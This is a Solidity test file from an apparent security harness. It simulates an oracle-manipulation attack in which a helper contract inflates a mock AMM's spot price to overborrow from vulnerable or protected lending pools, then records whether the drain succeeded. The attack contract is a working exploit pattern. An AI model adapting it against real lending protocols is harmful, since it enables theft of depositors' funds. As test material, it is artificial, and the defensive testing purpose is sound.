// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/mocks/MockERC20.sol";
import "../targets/SimpleAMM.sol";
import "../targets/LendingVulnerable.sol";
import "../targets/LendingProtected.sol";

/// @notice Helper attack contract executing oracle manipulation against lending targets
contract OracleAttacker {
    MockERC20 public collateralToken;
    MockERC20 public borrowToken;
    SimpleAMM public amm;
    address public owner;

    constructor(address _col, address _bor, address _amm) {
        collateralToken = MockERC20(_col);
        borrowToken = MockERC20(_bor);
        amm = SimpleAMM(_amm);
        owner = msg.sender;
    }

    function attack(address lendingPool) external {
        borrowToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(lendingPool, type(uint256).max);

        // Step 1: Swap 200 BOR into AMM to drastically inflate COL spot price
        uint256 colBought = amm.swap(address(borrowToken), 200 ether);

        // Step 2: Deposit 15 COL into LendingPool
        (bool depOk, ) = lendingPool.call(
            abi.encodeWithSignature("depositCollateral(uint256)", 15 ether)
        );
        require(depOk, "Deposit collateral failed");

        // Step 3: Borrow 80 BOR against inflated collateral
        (bool borrowOk, bytes memory errData) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", 80 ether)
        );
        if (!borrowOk) {
            assembly {
                revert(add(errData, 32), mload(errData))
            }
        }

        // Step 4: Swap remaining COL back to recover BOR
        if (colBought > 15 ether) {
            amm.swap(address(collateralToken), colBought - 15 ether);
        }

        // Send all collected BOR to owner
        borrowToken.transfer(owner, borrowToken.balanceOf(address(this)));
    }
}

/// @title Oracle Manipulation Attack Simulation
/// @notice Simulates spot price distortion on an AMM to overborrow from a lending market.
contract OracleManipulationTest is SentinelBase {
    MockERC20 public collateralToken;
    MockERC20 public borrowToken;
    SimpleAMM public amm;

    function setUp() public {
        collateralToken = new MockERC20("Collateral Token", "COL", 18);
        borrowToken = new MockERC20("Borrow Token", "BOR", 18);

        // Deploy AMM with token0 = collateral, token1 = borrowToken
        amm = new SimpleAMM(address(collateralToken), address(borrowToken));

        // Honest LP supplies 100 COL and 100 BOR to AMM (Initial spot price: 1 COL = 1 BOR)
        collateralToken.mint(honestUser, 100 ether);
        borrowToken.mint(honestUser, 100 ether);

        vm.startPrank(honestUser);
        collateralToken.approve(address(amm), 100 ether);
        borrowToken.approve(address(amm), 100 ether);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();
    }

    function test_oracle_manipulation() public {
        string memory variant = getVariant();
        bool isProtected = keccak256(bytes(variant)) == keccak256(bytes("protected"));

        address lendingPool;
        if (isProtected) {
            LendingProtected protectedLending = new LendingProtected(
                address(collateralToken),
                address(borrowToken),
                address(amm)
            );
            lendingPool = address(protectedLending);
        } else {
            LendingVulnerable vulnLending = new LendingVulnerable(
                address(collateralToken),
                address(borrowToken),
                address(amm)
            );
            lendingPool = address(vulnLending);
        }

        // Honest LPs supply 100 BOR liquidity to Lending Pool
        borrowToken.mint(honestUser, 100 ether);
        vm.startPrank(honestUser);
        borrowToken.approve(lendingPool, 100 ether);
        (bool supplyOk, ) = lendingPool.call(
            abi.encodeWithSignature("supplyBorrowLiquidity(uint256)", 100 ether)
        );
        require(supplyOk, "Lending liquidity supply failed");
        vm.stopPrank();

        // Attacker starts with 300 BOR
        borrowToken.mint(attacker, 300 ether);
        uint256 attackerBorBefore = borrowToken.balanceOf(attacker);

        vm.startPrank(attacker);
        OracleAttacker attackContract = new OracleAttacker(
            address(collateralToken),
            address(borrowToken),
            address(amm)
        );
        borrowToken.transfer(address(attackContract), 300 ether);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.attack(lendingPool) {
            uint256 attackerBorAfter = borrowToken.balanceOf(attacker);
            if (attackerBorAfter > attackerBorBefore) {
                attackSucceeded = true;
                note = "drained lending pool via manipulated AMM spot price";
            } else {
                note = "manipulation executed but produced no net profit";
            }
        } catch Error(string memory reason) {
            note = string.concat("oracle manipulation blocked: ", reason);
        } catch (bytes memory) {
            note = "oracle manipulation blocked by circuit breaker";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (borrowToken.balanceOf(attacker) > attackerBorBefore) {
            netProfit = borrowToken.balanceOf(attacker) - attackerBorBefore;
        }

        emitSentinelResult("oracle", variant, attackSucceeded, netProfit, note);
    }
}
